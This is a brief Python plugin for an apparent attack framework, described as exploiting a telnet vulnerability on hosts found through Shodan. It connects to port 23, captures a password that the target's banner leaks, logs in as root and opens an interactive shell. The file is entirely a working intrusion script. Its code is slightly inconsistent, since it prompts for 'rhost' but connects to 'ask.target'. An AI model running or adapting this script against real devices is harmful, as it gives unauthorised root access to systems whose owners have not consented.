#!/usr/bin/env python3
Description = 'Exploits a telnet vulnrability using shodan'
from pluginsupport import *

rhost = ask('rhost')

def run():
    import telnetlib
    try:
    	warning("Connecting to %s..." % (rhost))
    	tn = telnetlib.Telnet(ask.target, 23)
    	tn.read_until("passwd:")
    	PASS = tn.read_until("\n")
    	tn.read_until("login: ")
    	tn.write("root\n")
    	tn.read_until("Password: ")
    	tn.write(PASS + "\n")
    	tn.interact()
    except KeyboardInterrupt:
    	exit()
